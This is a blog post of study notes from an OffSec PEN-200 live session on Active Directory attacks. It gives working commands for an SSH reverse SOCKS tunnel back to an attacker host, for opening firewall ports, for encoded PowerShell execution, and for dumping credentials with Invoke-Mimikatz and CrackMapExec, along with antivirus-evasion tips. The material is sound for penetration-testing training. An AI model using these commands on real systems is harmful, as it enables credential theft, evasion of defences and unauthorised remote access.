---
title: 'OffSec Live: PEN-200'
date: 2022-08-31 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-08-31-offsec-live-pen-200.html
author: 100007
---

# Active Directory Enumeration & Exploitation, Part 3

To use SSH as a generic SOCKS5 proxy, just use remote port forwarding.

```
# This command is run from the TARGET and connects back to the ATTACKER
# box. PORT on the ATTACKER box can then be used as a SOCKS5 proxy via
# proxychains, etc.
#
ssh -R $PORT $USER@$ATTACKER
```

To remember the difference between local and remote port forwarding, think of local port forwarding as connecting a port on the local machine to a remote service, while remote port forwarding connects a port on a remote machine to the local service - or SSH instance (if _only_ a port is given)! Setting up SSH as a proxy doesn’t make sense in the context of the local port forwarding, but can make sense for remote port forwarding.

(SSH port forwards are always read as `$FROM_MACHINE:$FROM_PORT:$TO_MACHINE:$TO_PORT`.)

Check Windows Firewall state:

```
netsh advfirewall show currentprofile
```

See all Windows Firewall rules for inbound connections:

```
netsh advfirewall firewall show rule dir=in name=all
```

Be aware that most built-in rules on Windows are bound to particular applications. But admins are lazy, and seldom bind custom rules to explicit applications. There’s no 100% reliable way to identify such rules, but they’ll often have obvious naming conventions.

See all Windows Firewall rules for outbound connections:

```
netsh advfirewall firewall show rule dir=out name=all
```

In general you don’t want to turn off the Windows Firewall, as doing so will generate a popup for any users currently logged into the machine.

Punch a hole in the Windows Firewall for ports 80, 443, and 4444:

```
netsh advfirewall firewall add action=allow name=tunnel_in `
      dir=in protocol=tcp localport="80,443,4444"
netsh advfirewall firewall add action=allow name=tunnel_out `
      dir=out protocol=tcp localport="80,443,4444"
```

Encode a command to base64 in PowerShell:

```
$Text = "$ONE_LINE_POWERSHELL_COMMAND"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```

Run this using:

```
powershell.exe -enc $EncodedText
```

See logged in users with PowerView.ps1:

```
Get-NetLoggedon | select UserName
```

Mimikatz binaries are generally detected by AV on download these days, but fortunately there’s a PowerShell reimplementation that can be run after bypassing AMSI.

```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' > C:\mkat.txt
```

Note, however, that Microsoft Defender will still detect the execution of Invoke-Mimikatz and kill the hosting PowerShell process. This is why we need to redirect the output to a file.

AV can also by bypassed using CrackMapExec:

```
crackmapexec smb $TARGET_NETWORK/$TARGET_NETMASK \
	-u $TARGER_USER -p $CRACKED_PASSWORD --lsa 2> /dev/null
```

This only works if `$TARGET_USER` is an admin. If a user’s password is currently in memory, CrackMapExec will dump this as well (so then you don’t need to crack the hash!).

- [OffSec Live](https://www.offensive-security.com/offsec/offsec-live/)
- [Join OffSec Live](https://learn.offensive-security.com/offsec-live-webinars)
- [PowerShellMafia / PowerSploit / Recon / PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [EmpireProject / Empire / data / module\_source / credentials / Invoke-Mimikatz.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1)
